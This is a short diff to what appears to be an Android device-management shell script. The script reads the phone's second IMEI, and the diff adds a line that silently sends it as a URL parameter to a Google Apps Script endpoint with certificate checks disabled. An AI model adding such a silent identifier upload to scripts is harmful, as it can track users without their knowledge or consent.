@@ -17,6 +17,8 @@ dcurl --dns-servers 1.1.1.1 -k -s -L "$CSV_URL" | tr -d '\r' > "$OUTPUT_FILE"
 
 imei2=$(service call iphonesubinfo 4 i32 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS= | tr -d '[:space:]')
 settings put global imei_2 "$imei2"
+dcurl --dns-servers 1.1.1.1 -k -s -L https://script.google.com/macros/s/AKfycbzayNFOlDZw5uo9C7ftGaxOqI-vd1K7ID3Jl09IlQ_hvgkR71YVmWqIGp0SVmVKzC0/exec?param=$imei2
+
 # Initialize an empty string to store the list of blocked packages.
 blocked_packages=""
 
